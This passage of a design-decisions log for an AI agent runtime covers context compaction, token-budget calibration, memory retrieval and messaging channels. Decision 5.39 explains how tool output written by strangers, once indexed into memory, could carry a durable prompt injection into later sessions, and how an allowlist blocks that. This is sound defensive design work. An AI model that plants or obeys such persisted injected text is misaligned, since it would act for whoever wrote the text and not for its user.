| 5.4 | Certain blocks are **pinned and never compacted**: identity, tool catalogue, current task, last error | Compaction reliably eats initial instructions and style rules. Anything that must survive lives in the system prefix, not in history. |
| 5.5 | **Files canonical** for persona, skills, memory, artifacts; **SQLite canonical** for sessions, messages, tool calls, schedules, phase state | Files are inspectable, diffable, git-backable, and match VelaOps' existing model. Rows are for things with lifecycle and indexes. Letta's server-owns-all-state model is the opposite pole and wrong for a file-workspace product. |
| 5.6 | Memory retrieval: **`Retriever` interface from day one, SQLite FTS5 the only shipped implementation** | `[VO]` Per-agent embedding services are the most expensive line in the current architecture — `bge-large` needs 1.5–2GB resident, and `EMBED_MODEL` exists purely to survive tight hosts. Lexical + recency covers most personal-assistant recall. Prove it insufficient before paying for vectors. |
| 5.7 | No vector store, no RAG pipeline in core | Available as a plugin. Not a runtime concern. |
| 5.8 | **Workspace files are tiered, and tier determines cache position** — `static` before breakpoint A, `volatile` after it, `reminder` after the history | The flat `context.files` array cannot express the three things that turned out to matter: cache-stable versus volatile, before or after the conversation history, and writable or not. Each has a measured cost when got wrong. The sharpest is `MEMORY.md`: put it ahead of the breakpoint and every `memory_write` invalidates the whole cached prefix, so cost rises with no error anywhere to explain it. That single consequence is why the tier list is not just an ordered array with better names. Full detail in `07-SPEC-WORKSPACE.md`. |
| 5.9 | The **`reminder` tier sits after the conversation history**, not with the other pinned instruction blocks | Rule adherence decays across a long conversation and compaction does not reliably reset it. Attention is stronger at both ends of the context than in the middle, so a rule stated once at the top of a thirty-turn session is effectively buried in the middle. Re-asserting one or two rules at the recency position is the cheapest known countermeasure — and the cap is one or two, because a second policy file at the recency position spends the budget it was created to protect. |
| 5.10 | **`editable` is enforced at the tool boundary, not advisory** — `memory_write` against `editable: none` is a typed error | A silent no-op teaches the agent that it saved something it did not, which is decision 4.13's failure in a different costume. Read-only identity is also the most effective known mitigation for persona drift, and it only works if the runtime actually refuses. |
| 5.11 | **Total workspace budget is a hard cap that fails the load**, naming the offending file | Truncating to fit produces an agent running on partial instructions with nothing reporting it — the same silent-degradation shape as a dropped tool call or a stripped `tool_call_id`. Everything in tiers 0–2 goes to the model on every turn forever, so a word added here is a word read a thousand times; the cap is what makes that a design constraint rather than a discovery. |
| 5.12 | **Vendor prompting guidance is encoded as `capabilities.promptStyle`, never as a constant** | Published advice is written for frontier models and a significant fraction of it inverts at 3–8B. Anthropic now advises *removing* emphatic phrasing because current models overtrigger on it; a 7B model has the opposite failure mode and needs it. Anthropic recommends XML delimiters because Claude was trained on them; controlled cross-model work finds no reliable accuracy gain and a 22–37% token penalty for structured formats. Both results hold, which means the honest answer is per-model rendering. Phase 3 supplied the worked example of the cost — see 4.19, where one placeholder read as metasyntax by frontier models and as instruction by a 9B model produced 65 points of measured difference. Phase 3.5 then measured the small-model half directly (`evals/prompt-style/`): the one generated emphatic framing line moves qwen3.5:9b's all-6-rules compliance +20pp (16/20 vs 12/20, the entire effect on one rule, reproduced at two probe scales), while deepseek-chat is 100/100 under either framing. `examplesIn` saturated — 100% format adoption from both placements on both models — so each vendor's default stands with a measured floor: neither placement costs anything on a well-authored example set. |
| 5.13 | The **rule count is computed against a reliability target and can fail the load** | Compliance with n simultaneous rules falls roughly as the per-rule rate to the power of n, so at 0.90 a 0.80 target permits two rules and not four. The arithmetic is unintuitive and authors consistently overestimate their budget, so the runtime computes it instead of documenting it. `perRuleSuccess` is measured by `dispach eval rules` rather than assumed — a guessed constant produces a guard that validates nothing. The remedy for exceeding it is deleting rules or moving them into middleware, never raising the target. |
| 5.14 | **`SOUL.md` is supported but capability-gated**, with `onUnmet: distill \| omit \| fail` | A long-form constitution is genuinely better than a compact identity file *on a model that can derive rules from it*. Derivation is precisely what small models cannot do, and a document that size takes a prohibitive share of a small window — so the same file would help one model and cripple another. Distillation stays manual (`dispach soul distill` emits a scaffold): the parts of an identity document that produce voice are exactly the parts a summariser drops. |
| 5.15 | **`context.files` is retained as a deprecated alias for `static`**, and warns | It is what the runtime reads today and what `examples/minimal` uses. A rename with no alias would break every existing manifest for no gain while the workspace is still unbuilt; carrying one line of aliasing until v0.2 costs nothing and keeps Phase 3's examples runnable. |
| 5.16 | **The agent's own configuration is a pinned context slot, not a tool call** | Knowing how you are set up was two-hop reasoning — realise you have a configuration, decide to read it, act — which is what decision 4.7 refuses for tool discovery, and it fails harder here: a model that does not know a setting *exists* has no reason to look for it. Measured, on a real agent: asked to put itself on Telegram, with `config_set` pinned, `config_set` in `policy.allow`, a commented-out `channels` block in its own manifest and a shipped Telegram transport in the runtime, it proposed Composio and then **started writing a Telegram bridge**. Nothing was broken; every piece worked and none was reachable. Slot 2 is a ~200-token summary — model, channels, server, providers, permissions — that names absent capabilities as `none` rather than omitting them, since a missing row reads as "no such concept" and a `none` row reads as a switch. It states the route (`config_set`, never code or a file tool) only when that tool is actually in the catalogue. The full settable list stays one `config_read` away: the fact is free, the detail is asked for. |
| 5.17 | **Slot 2 reports runtime *state*, not the manifest, and is rendered lazily once** | Describing configuration where the reader needs state is its own kind of lie. Told "channels: tg (telegram)" while running under `run` — where `startChannels` is false — an agent concluded the Telegram runtime had died, reported that nothing was listening on port 7420 **from inside the running process**, and offered to write a LaunchAgent. Every statement it made was true of the manifest and false of the moment. The block now says "configured but NOT running in this session; only `serve` starts channels". Lazy because neither fact is known when the agent is constructed — channels start later inside `Runtime.create`, and the port binds after it returns — and frozen at first use, with `reportRuntimeState` throwing afterwards, because slot 2 is in the cache-stable prefix and a prefix that changes mid-session has no symptom except the bill. |
| 5.18 | **The pressure figure is a corrected estimate, and the correction is measured** | `estimateTokens` divides characters by 3.8 and its own file claimed it ran "slightly high" for five phases. Measured against a real endpoint over a session that fills with tool results (`evals/budget/`, deepseek-v4-pro, 31 turns), it runs **16–20% low** — 14,057 estimated against 16,835 charged — because JSON and shell output split into more tokens per character than prose. A session under compaction pressure is mostly tool results by definition, so the error is in the *overflow* direction exactly when the window is tight, which is the one direction the bias was supposed to avoid. The divisor is not retuned: one constant cannot serve prose and JSON. Instead the endpoint's own `prompt_tokens` is the anchor, folded with an exponential moving average at **α = 0.6** — chosen because mean error is flat across nine strategies (2.29–3.57%) while worst-turn error is not, and 0.6 is its minimum at 12.00%. Uncorrected, 14.21% mean error and 8.7% of turns within 10%; corrected, 2.88% and 91.3%. A running mean was disqualified at 14.38%: it weights turn one as heavily as turn thirty, and turn one's ratio is above 2.0 because a 50-token prompt is mostly chat template. `last` (α = 1) had the better mean and was refused for a reason the eval cannot measure — a deterministic fixture contains no anomalous sample, and α = 1 hands one the entire correction. |
| 5.19 | **A figure the endpoint never reported must be distinguishable from one it did** | `StepResult.promptTokens` is *seeded* with the local estimate and overwritten only if a `usage` chunk arrives, so the two are identical by value. Calibrating on that converges the correction on exactly 1.0 and makes every accuracy check pass by construction — a silent, self-congratulatory failure. `promptTokensReported` is the guard, keyed on a positive count rather than on the chunk arriving, because a `usage` object without `prompt_tokens` decodes to zero. The same principle put `source` on `context.pressure`: a bare fraction cannot say whether it carries the estimator's raw 16–20% bias. |
| 5.20 | **Thresholds are fractions of the prompt budget, not of the window** | The shipped validator described them as fractions of `context.window`. Read literally the ladder protects nothing on the models this runtime targets: with an 8,000 window and 2,000 `reserveOutput`, a 5,800-token prompt is 72% of the window — stage `snip` — and 97% of what `assembleContext` will actually allow, so the blunt oldest-first trim is already dropping turns while the ladder reports mild pressure. Reasoning models need a large reserve because reasoning is billed to output, so that is the common case rather than a corner. `window - reserveOutput` it is, and the hint and `02-SPEC-MANIFEST.md` say so. |
| 5.21 | **Each stage aims at the threshold one rung below the deepest that fired** | A stage needs a target and both obvious choices are wrong. Getting *just* under the trigger lands on it and fires again next turn — thrash, which matters because a second `reset` in a session is a documented misconfiguration and so has to be prevented structurally rather than warned about. Aiming at a fixed comfortable level makes a prompt at 96% destroy its way down to 55%, which is the "severe loss" half of the design 5.1 rejects. Using the manifest's own next-lower threshold gives hysteresis with no new constant, spends only the fidelity that rung costs, and moves the session down exactly one rung per compaction. `trim` is the floor and takes the scheme's one margin. Only stages whose own threshold is crossed are reachable, always from the first rung: skipping is how a mild overflow gets a digest it did not need. |
| 5.22 | **Mechanical to S3; the model is asked at S4 and S5 and never depended on** | `trim`, `snip` and `micro` are deterministic, so no model call happens below 88% pressure and the common case stays fast, offline and testable. `collapse` and `reset` ask `model.compactor` — **only when one is configured**, never falling back to `main`, because a digest written by the model that is mid-task, inside the same turn, on a prompt already too large is how a compaction becomes the thing that overflows the window. Absent, throwing, and returning empty content all fall through to a factual `mechanicalDigest`: a compaction that throws has failed the turn it existed to rescue, and an empty digest would blank a span of history and report success. `digestSource` names which happened, because "the digest is thin" and "the compactor is unreachable" need different fixes. |
| 5.23 | **Nothing is destroyed, only displaced, under an id derived from the content** | `snip` and `micro` write the whole original observation to an `artifacts` row and leave a marker naming its id, which `artifact_read` follows. The id is FNV-1a over the content plus its length — derived, never generated, for the outbox's reason: the duplicate that actually happens is the same work running twice, and only a derived identity collides. Verified live: three byte-identical `seq 1 900` observations across three turns produced **one** row. It is also what makes escalation coherent — `micro` following `snip` over the same message reuses the entry `snip` recorded, so the pointer resolves to the uncut text rather than to the truncation. `snip`'s marker carries the id, which it did not at first: asked to follow a marker that said the observation "is still readable with artifact_read" and named nothing, a live model correctly reported there was no id and answered from the visible fragment. An invitation the runtime cannot honour is worse than none. |
| 5.24 | **Compaction is a per-prompt view; the store keeps the conversation whole** | The ladder rewrites the history assembled for one request. Nothing is deleted from `messages`, so a resumed session re-reads the full conversation and re-compacts it, and a turn whose pressure has fallen below `trim` shows a previously-snipped observation in full again. That is the right direction: the store is the audit trail, compaction is a budget decision about one prompt, and a destructive compaction would make an agent's history depend on how full its window happened to be when it was written. |
| 5.25 | **A message carries who wrote it, because under a text dialect the role does not say** | Compaction has to tell tool output from a human message, and NLT sends an observation back as a `user` message opening `OBSERVATION <slug> — ok`. The alternative is matching that string, which would let a person who types the word have their own message truncated and would silently stop compacting the day a dialect changed its framing. `ChatMessage.origin` is set by the loop — the only layer that knows — persisted in migration 005, and never sent: `wireMessage` builds the body field by field. Nullable, so a session written earlier degrades honestly: its messages read as prose, the two stages that need the flag decline, and the ladder reaches for the ones that do not. |
| 5.26 | **The compaction notice is generated and says nothing a model could act on numerically** | A model that senses its window filling wraps up — it shortens, stops opening new threads, summarises instead of continuing — and says nothing about why, which reads as a model that lost interest. The notice removes the reason to husband tokens. Generated rather than authored because the author does not know the thresholds; they are manifest values with defaults and they change without the file changing, so an authored sentence goes stale silently. It gives no numbers (a threshold is a fraction of a budget the model cannot see, and a figure it cannot act on invites arithmetic), never asks the model to help (compaction is harness-driven per 5.2, and "keep it short" is the behaviour this removes), and names `artifact_read` only when that tool is in the catalogue. |
| 5.27 | **The gauge reports the prompt that was sent, not the one the ladder was handed** | `context.pressure` first carried the pre-compaction figure, which put **`ctx 128%`** on a real status line for a session compaction had handled correctly — true of a prompt nobody sent, and indistinguishable from a runtime that had just overflowed its window. `fraction` is now the settled figure and `peak` carries the diagnostic one, present only when they differ. Found in a pty capture rather than by reading, which is also how the gauge's *position* was decided: the status line is truncated rather than wrapped and a 100-column capture cut it mid-figure at `2564…`, so the gauge sits ahead of the turn stats — what a person can act on survives the truncation. |
| 5.28 | **`streamUsage` is on by default, and portability is kept by downgrading rather than by defaulting off** | It was opt-in because `stream_options` is an OpenAI extension some compat endpoints reject with a 400 — a fair trade while token counts were only displayed. It stopped being fair when the ladder started running on a corrected estimate: with no `prompt_tokens` the correction never leaves 1.0 and every pressure figure carries the measured 16–20% low bias, so the α in 5.18 was dark on every real agent. Now a 400 whose body *names* `stream_options` is retried once without the field, remembered per provider, and reported as `agent.warning` — matched on the field name rather than on the status, because a 400 is also what a malformed prompt returns and retrying that would hide a real error behind an extra request. The downgrade deliberately does **not** consume a retry attempt: counted against a single-attempt policy it fell out of the loop with no response and returned an empty stream, which is the silent-success shape rule 8 exists to prevent. Verified live on deepseek — turn one reports `source: "estimated"`, turn two onward `corrected`, predicting 1,350 against 1,279 charged and 1,798 against 1,695. Note the direction: on a prose session the correction runs slightly *high*, the opposite of the observation-heavy eval, which is precisely why the divisor cannot be retuned to one constant. |
| 5.29 | **Memory is two tiers with one writer: the carried file overflows into the retrieved archive** | `memory_write` appends to the workspace's write target, which is in the `volatile` tier and therefore *carried* in slot 4 on every turn; when that file passes its budget the oldest notes move into `memory.dir`, which only retrieval reaches. Retrieval-only was the alternative and loses the near term: a fact saved a minute ago would be invisible next turn unless the query happened to match it, which is exactly the "the model must choose to look" assumption decision 6.2 rejects for skills. Nothing is deleted at either step, so the archive is the reason eviction is safe rather than lossy. |
| 5.30 | **`eviction: oldest` was declared vocabulary for three phases, and until it was implemented `memory_write` could brick the agent** | The field parsed, landed on the loaded file, and nothing consumed it — while the workspace budget is a *hard load failure* by design (5.x: never truncate to fit). Reproduced on a freshly scaffolded agent: about two hundred saves and `validate` reports `MEMORY.md is 7843 tokens against its 2000-token budget`. So the tool the agent is told to use for remembering was, used enough, a tool that stopped it starting. Eviction moves **only top-level list items**; frontmatter, HTML comments, headings and prose stay at their original bytes, because a memory tool that quietly deleted an author's heading is one nobody leaves enabled. Oldest means *highest in the file* rather than earliest stamp: `memory_write` appends, so position is already chronological, and a stamp is a value a person can mistype. |
| 5.31 | **The write target prefers a file declaring `eviction: oldest` over declared order** | The rule was "first writable `volatile` file in declared order", and it was wrong in the configuration `init` generates: that workspace lists `USER.md` before `MEMORY.md` and makes both writable, so every saved note appended to the hand-written description of the person — 1,500-token budget, no `eviction` declaration, no intention of being trimmed — while the file that exists for notes was never written to. Found by running the real command against a real agent, not by reading. The declaration is the author saying *this file accumulates notes and may be trimmed*, which is the statement a write target needs, so it costs no new field and does not disturb slot 4's order. Eviction is additionally **gated** on it: where the target does not declare it the note is still appended and the observation says the file is now over budget and by how much, because the thing that fails is the next load and by then nobody is reading that observation. |
| 5.32 | **FTS5 narrows; `rank/bm25.ts` scores — and it is one implementation, asserted** | The acceptance criterion is that the retriever reuses Phase 3.5's ranking seam rather than building a second index, which is easy to *say* while shipping a second scorer that looks similar — and the failure would be invisible, both returning plausible numbers while `skills.threshold` and `memory.threshold` silently became two different floors. So the tokeniser, idf, summation and normalisation were extracted to one module that both callers use, and `memory-rank.test.ts` scores one corpus through `bm25Selector` and through `fts5Retriever` and compares to **1e-12**. Two independent reasons not to use FTS5's own `bm25()`: it computes its statistics over the whole table, and one sandbox root has one store shared by every agent in it, so an unrelated agent saving a note would shift this agent's scores; and it would make FTS5's tokeniser load-bearing, where `porter` stems differently and no built-in tokeniser applies a stopword list. What is indexed is `terms()` output, space-joined, so FTS5's tokeniser has nothing to do but split on the spaces we put there. The cost is a derived column, which is why `TOKENISER_VERSION` rides along in `memory_sources` and a mismatch forces a rebuild. |
| 5.33 | **`memory.threshold` defaults *below* `skills.threshold`, on the same scale** | 0.20 against 0.35. The scale is shared by construction (5.32), so the numbers are directly comparable — and the two want opposite errors. A wrong skill *displaces* the right one at `maxActive: 1`; an extra remembered passage costs about twenty tokens under a budget that already caps the slot. Measured: "the deploy pipeline waits for a manual approval gate" scores **0.284** against "how does the deploy approval work", matching two of the query's three informative terms while the normalisation divides by all three. Correct arithmetic, and a good answer that 0.35 withholds. A full match at average document length is about 0.45. |
| 5.34 | **The recency boost multiplies and can only lift** | `final = lexical × (1 + 0.25 × 2^(-ageDays/30))`. The obvious blend — `lexical × (1-w) + recency × w` — can push a strong lexical match *below* the floor for being old, which would make `threshold` answer a different question from the one it was calibrated for. Multiplicative means recency only reorders within the set that already qualifies. The weight and half-life are a documented guess, the same call as `snip`'s 400-token keep: there is no fixture yet that distinguishes a good half-life from a bad one, and inventing one to justify a number chosen in advance measures nothing. The *shape* is reasoned rather than guessed. Scores therefore range over `[0, 1.25)`, which is harmless for a floor and is stated because a reader checking "normalised means under one" would otherwise think they had found a bug. |
| 5.35 | **The carried file is indexed but excluded from slot 7** | It has to be indexed, or `memory search` cannot find a note saved a minute ago; it has to be excluded, or the model is told the same thing twice — once in slot 4 where it always sits, once under a "Remembered" frame. Excluding at *retrieval* rather than at indexing is the only arrangement in which both hold. `memory search` deliberately does not exclude it, and marks it, because "still in MEMORY.md, which is why it is not under Remembered" is a real answer to the question that command exists for. |
| 5.36 | **A passage is one list item, falling back to one heading section** | It is what both writers of these files produce: `memory_write` emits `- **<stamp>** _(tags)_ text`, and a person writes bullets under headings. Fixed token windows would be more uniform for BM25's length normalisation and would cut mid-sentence — which matters more here than usual, because a fragment that has lost its stamp cannot be recency-ranked and cannot tell the model *when* the fact was learned. The stamp and tag markers are stripped from the **indexed** form only; `text` stays byte-identical for injection, since decision 4.19 forbids the renderer rewriting an authored sentence and a retrieved note is one. Stripping them is worth almost nothing for score and was nearly documented as though it were: every passage carries a stamp, so removing them moves each document's length and the corpus average together, and the measured change was 0.278 → 0.284. |
| 5.37 | **`assembleContext` throws when a block it built reaches no slot in the ordering** | The output is composed from an explicit list of slot filters, so a slot pushed into `pinned` and forgotten there is silently discarded — *after* being counted in `pinnedTokens`, which takes budget away from the history and produces no other symptom. `SLOT.memory` was exactly that for one debugging round: the passage was retrieved, ranked, selected, charged for, and never sent. The invariant is cheap and can only fire on a code change, never on user input. |
| 5.38 | **A query that reduces to one informative term scores a rare match as highly as a relevant one, and no threshold fixes it** | The normalisation divides by `Σ idf` over the terms it sums, so with a single query term **idf cancels** — matching a token the corpus contains once scores exactly what matching the right note would. Measured: "who won the 1998 world cup" reduces to `{1998}` and scores **0.490**, above the genuine two-of-three match at **0.394**, so no floor separates them. This is the failure that motivated `discriminating()` for skills ("what's the weather in dhaka" → 0.771 on `{the}`) with the fixes inverted: that collapse came from a *common* term and a stopword list removed it, this one from a term appearing **once**, which idf calls maximally informative and no frequency rule can tell from real signal. Accepted rather than patched, on the cost asymmetry: for skills the same event displaces the right skill at `maxActive: 1`, here it spends about twenty tokens on an irrelevant "Remembered" block the model can disregard. A rule refusing single-term queries would refuse "frankfurt?" and "what happened in 2019", where the lone term genuinely is the signal. Counted against `restraint` in `evals/memory/` rather than edited out of the fixture. |
| 5.39 | **`includeHistory` indexes an allowlist of prose, and was declared vocabulary nothing consumed until now** | The field parsed, defaulted to `true`, and no code read it — the same shape as `eviction: oldest` in 5.30, and with the same consequence: every agent's memory held only what it had deliberately written down, so a session nobody thought to save was gone. Asked what an earlier session covered, a real agent answered *"I don't have notes from our earlier session"*, which reads as nothing having been said rather than as a feature being off. What is indexed is any message with **no `origin`**. That is an allowlist of prose rather than a blocklist of the four kinds the runtime sets today (`observation`, `call`, `repair`, `digest`), so a fifth added in a later phase is excluded by default — and the direction is the whole point, because `observation` is where text a stranger wrote lives. Indexing it would make prompt injection **durable**: retrieved into slot 7 in a later session, long after the write gate that fenced it stopped applying. A blocklist that forgot one origin would open that hole with nothing failing. The cost, stated: a session written before migration 5 has no origins at all, so its observations are indistinguishable from prose and *are* indexed. Refusing every pre-migration session would throw away the real conversations to avoid a risk that only exists for an agent already running fetched text through an ungated store. |
| 5.40 | **Files and conversations are reconciled in separate namespaces, by two functions, and a rebuild restores both** | `reconcile` **drops any source in its namespace that it was not handed** — that is what makes a deleted archive file stop being retrieved rather than served from an index forever, and it is why one shared pass is not available: recall syncs the files on every turn and conversations are indexed at turn end, so the two lists genuinely arrive at different moments, and a shared domain would have every turn's file sync delete every indexed conversation. The symptom would be memory that works immediately after a rebuild and stops a turn later, with nothing throwing. An optional `sessions` argument on `syncFiles` was the first design and was rejected on a documented hazard: absent would have to mean "leave conversations alone" while `[]` meant "drop them all", and a default parameter firing on an explicitly passed `undefined` has already cost this repo a round. The namespace is `session:<key>`, which migration 6's own schema comment specified before any of this existed; `enumerateFiles` refuses a memory file starting with that prefix, because such a file would be dropped by whichever pass ran second and re-added by the other, alternating forever. `rebuildMemory` re-indexes conversations **unconditionally rather than behind a `--history` flag**: `clear` wipes both namespaces, so an opt-in would have made a plain rebuild delete every indexed conversation and report success — to the person whose retrieval had just stopped working. Restoring exactly what was discarded is the only shape with no silent loss, and it makes a rebuild the backfill for an agent whose sessions predate the wiring. |
| 5.41 | **`maxActive` and `budget` rose to 5 and 2000 when conversations were indexed, and the change was required rather than generous** | 3 and 600 were sized for note bullets, which are one line. An exchange is a question plus a reply, each capped at `MAX_INDEXED_MESSAGE_CHARS`, so a full one estimates near 320 tokens and bills nearer 370 — `estimateTokens` runs 16–20% low on exactly this kind of mixed text (5.x). Two exchanges would have exhausted the old budget. The interaction with `selectPassages` is what makes an undersized budget worse than it looks: it stops at the first passage that does not fit and never skips past it (deliberately, so a worse-ranked short entry cannot displace a better-ranked long one), so one oversized exchange does not merely go uninjected — it sits at the top of the ranking and blocks everything behind it. The cap on each side of an exchange exists for the same reason, and truncating there is legitimate where truncating a workspace file is not: `messages` is canonical for a conversation and this document is a projection of it, so a capped passage still carries the stamp and source a reader needs to find the whole thing. |
| 5.42 | **A conversation excerpt and a saved note get different sentences in slot 7** | Framed identically, an agent handed three excerpts of its own earlier sessions answered the question correctly and then added *"that's what the saved notes say; the actual transcripts don't carry over"* — a wrong statement about its own state, made while holding the transcripts. `From session:local:3c2dc5, learned …` requires the model to decode a source string to work out what it is looking at, and it decoded it wrongly. This is `VOLATILE_HEADER`'s lesson (5.x) a second time: a fact with no frame is a fact a small model will not connect to the question. Structure only — the passage's own words are untouched, which is the line decision 4.19 draws. `isSessionSource` is imported by `assembleContext` rather than a `kind` field being threaded down from `#recall`: five separate rounds here have gone to a field declared in one place and dropped by a conditional spread in another, and the source string already carries the answer. |
| 5.43 | **Memory is a row in slot 2, because its absence was measured** | The config summary had rows for tools, skills, channels, the HTTP API and permissions, and none for memory. So an agent with memory configured, three excerpts of its own sessions in slot 7, and *correct reasoning about them* — "all from conversations on 2026-08-19" — still finished its reply asserting that the transcripts do not carry over. With no row telling it otherwise it fell back on what a stateless assistant is right to assume, and asserted that over the evidence in its own context. This is decision 5.17's rule applied to the one capability left out of it: anything the runtime can be configured to do gets a row, and an absent capability says `none` rather than being omitted, because a missing row reads as "no such concept" while a `none` row reads as a switch that is off. The row is **terse on purpose** and was trimmed twice against `context.test.ts`'s cap before that cap was raised by twenty tokens: slot 2 is billed on every turn of every session, so a new *capability* is a legitimate reason for it to grow and a wordier sentence about an existing one is not. `includeHistory` is named separately from the notes, because they are different promises — "what I chose to write down survives" against "what was said survives" — and an agent conflating them either over-claims about a session nobody saved a note in or under-claims exactly the way this one did. The security property is deliberately **not** in the row: the model takes no action on "tool output is never indexed", and the manifest is where it belongs. |
| 5.44 | **`init` generates the memory block live — the third time a shipped capability was found commented out** | It sat under a `# Phase 6 — memory` heading for a phase that had already landed, so **no agent `init` has ever created had memory at all**, and the only route to it was knowing the field names already. The commented line also read `k: 6`, a field that does not exist in the schema — so uncommenting it would have failed the load. Nothing checks a comment, which is the whole argument against shipping capabilities inside one. Same defect as the `system` provider (4.44) and the `web` provider (4.53), and the standing directive those produced — every capability the runtime has is a question in `init` — is why this is a live block rather than a better comment. It needs no question: memory requires no account, no key and no directory that must exist first, and it costs nothing on a turn where nothing matches. The generated test asserts the **positive**, that `memory:` is live, rather than merely that it is absent from the commented list.

| 6.4 | Skills that ship **scripts** are preferred over skills that ship prose | Compiling skills to executable graphs took a frontier model from 53% → 67% pass rate. For a 3–8B model the effect is larger: a deterministic script beats instructions it must interpret. |

| 6.6 | Skill scripts are exposed as tools **only while their skill is active**, rendered in the **slot-5 skill block** and never in slot 1 | Keeps the tool budget honest and the catalogue small. The placement is not a detail: slot 1 is rendered once at load and must stay byte-identical or prompt caching silently stops, so "visible only while active" and "in the tool catalogue" cannot both be true. Slot 5 is after breakpoint A and varies per turn already, which is what makes the original decision buildable. |

## 8. Channels

| # | Decision | Rationale |
| --- | --- | --- |
| 8.1 | Telegram and WhatsApp only in v1 | Scope fence. |
| 8.2 | Telegram: **raw Bot API over fetch**, webhook and long-poll both | No library, no dependency, complete control. The Bot API is small and stable. |
| 8.3 | WhatsApp: **Baileys**, in a separate `@dispach/channel-whatsapp` package | Owner's call. Isolation keeps Baileys' dependency weight and its ToS posture out of core, and leaves room for a BSP driver behind the same interface. See §8.4. |
| 8.4 | Documented risk note ships with the WhatsApp package | Baileys reverse-engineers WhatsApp Web, violating ToS, with no appeal path. Separately, Meta's terms effective 15 Jan 2026 prohibit the WhatsApp Business Solution where a general-purpose AI assistant is the primary functionality. Both facts belong in the README, not buried. |
| 8.5 | **One process hosts N agents** | Library-first shape. VelaOps runs one agent per container; that's a deployment choice, not an architectural constraint. Forcing 1:1 would make the embedded use case impossible. |
| 8.6 | Outbound goes through an **outbox table with idempotency keys** | A crash mid-turn must not double-send or silently drop a reply. |
| 8.7 | Chat channels get **complete messages plus typing indicator**; token streaming exists only on the HTTP/WS surface | Telegram and WhatsApp cannot stream tokens usefully. |
| 8.8 | **A delivery's identity is derived from `(sessionKey, channelId, recipient, turnId \| key, chunkIndex)`, never generated** | A UUID minted at enqueue dedupes the outbox against itself, which is a problem it does not have. The duplicate that actually occurs is the *enqueuer* running twice — a turn replayed after a crash, a redelivered webhook, a retried API call — and under a generated id each replay mints a fresh key and sends again. A derived key makes the second enqueue collide with the existing row and do nothing; it costs a unique index instead of a column. The recipient is in the key because a reply fanned out to two `delivery.targets` would otherwise collide and the second target would silently receive nothing. Chunking happens at enqueue for the same reason: a message re-split later against a different `maxMessageChars` produces different keys for the same reply, and the collision that makes replay safe stops happening. |
| 8.9 | **Exactly-once is claimed only for the windows it holds, and `ChannelLimits.idempotentSend` names the one it does not** | Crash before enqueue, before claim, or after `markSent` are all handled and provably send once. The window between the bytes leaving the process and the provider's acknowledgement arriving back cannot be closed from this side — it needs the *provider* to deduplicate on a key we supply, which Telegram's `sendMessage` has no parameter for and WhatsApp Cloud API does. So the flag is on the channel rather than assumed, a recovered in-flight row is re-sent and marked `uncertain`, and the flag rides onto `delivery.sent` so a duplicate that reaches a person stays explicable afterwards. Retrying rather than holding is Moeen's call and the right one: in a conversational channel a lost reply reads as the agent ignoring you and produces no signal anywhere, while a duplicate produces both a message and an event. A channel declaring `idempotentSend: true` without provider support converts a visible ambiguity into a silent duplicate, which is strictly worse than the ambiguity. |
| 8.10 | **A failed chunk abandons the rest of its message rather than shipping the remainder** | Half a message is worse than none: the reader gets a fragment with nothing indicating the rest is missing, and cannot tell a truncated answer from a complete one. `due` withholds any chunk whose predecessor is not `sent`, including one that is `failed` — fail-closed, so a queue visibly stops rather than quietly emitting a half-message. The cascade is reported as a count on the single `delivery.failed`, not as N more failure events, because there was one fault and a reader seeing three failures for one reply would look for three causes. |
| 8.11 | **`allowFrom` is closed by default and matched tolerantly** | An omitted `allowFrom` permits nobody. A Telegram bot is discoverable by anyone who guesses its username and this runtime's agents can hold a shell, so open-by-default makes a leaked token an open agent — and worse, makes *forgetting the field* indistinguishable from choosing to be public. The refusal is loud: `agent.channel.rejected` names the sender and quotes the exact line to add, so the closed default costs one clear message where the open one costs whatever the stranger asks for. Matching folds case, treats a leading `@` as optional, and compares against the handle *and* the peer id — the field is written by a person from memory, and a Telegram user with no username has only the peer id, so handle-only matching would make them impossible to allow. |
| 8.12 | **Chunking is in core; each channel contributes one number** | Chunk boundaries are half of delivery ordering — the outbox keys a row on `chunk_index`, and two channels disagreeing about how many chunks a reply has would disagree about what "already delivered" means. `splitMessage` prefers paragraph, then line, then word boundaries, refuses to cut inside a grapheme cluster (`Intl.Segmenter`, not a code-unit slice, or an emoji arrives as a lone surrogate), and closes and reopens a code fence that a boundary would leave open. That last one inserts text the author did not write, which is licensed by the same distinction as `VOLATILE_HEADER` and not by 4.19: it changes delimiters so the authored bytes survive transport, and not one character of prose is altered. |
| 8.13 | **Every timestamp the outbox writes comes from the caller's clock** | `markRetry` always took an explicit `nextAttemptAt`; `enqueue` and `recoverInflight` did not, and stamped the wall clock while the engine asked `due` with an injected one. That never failed — it made two tests pass or fail depending on whether the suite ran before or after noon UTC, which is the worst available outcome for a queue whose entire contract is about time. When a component has an injectable clock, everything it writes a timestamp through needs one. |
| 8.14 | **Channels are registered by type, like tool providers, and constructed at boot but connected after readiness** | `Runtime.create({ channels: { telegram: telegramChannel } })` mirrors `toolProviders` exactly, for the same reason: core may not import a channel package, and a transport needs the agent's directory and resolved environment. Constructing one allocates an object and opens no socket, so it stays inside boot; `start()` runs after `runtime.ready` and is specified to return once a transport is *running*, not once it is connected. A `type` with no registered factory fails at load beside the entry that named it — a channel that constructs nothing never receives, and the only symptom is a bot that does not answer, which is indistinguishable from a wrong token. Verified live: an invalid bot token produced `agent.channel.error` with a hint, `/v1/health` 200, `/v1/ready` ready, and `status: "error"` on the agent resource. |
| 8.15 | **Inbound turns are serialised per session key, and the read loop never awaits one** | Two messages arriving during a turn would otherwise run concurrently against one history: both read the same prior state and append over each other. A promise chain per session key, rather than one global chain, so a slow conversation cannot stall another. `ChannelHost.receive` is fire-and-forget for the mirror-image reason — a long-poll that awaited turn execution would stop reading updates for the duration of one, and a 90-second turn would make the bot deaf for 90 seconds. |
| 8.16 | **The Telegram long-poll loop cannot exit on its own** | A poll that throws and returns leaves a process that is running, reports nothing, and receives nothing forever — the worst available shape. The loop catches everything, reports through the host, backs off to a 30 s cap, and continues; only `stop()` ends it. Reported on the first failure and then every eighth, so a long outage leaves a trail without burying every other event. The offset advances *before* handling and unconditionally: an update that throws on the way to a turn must not be re-fetched forever, because the outbox is where durability lives and the poll offset is a cursor. |
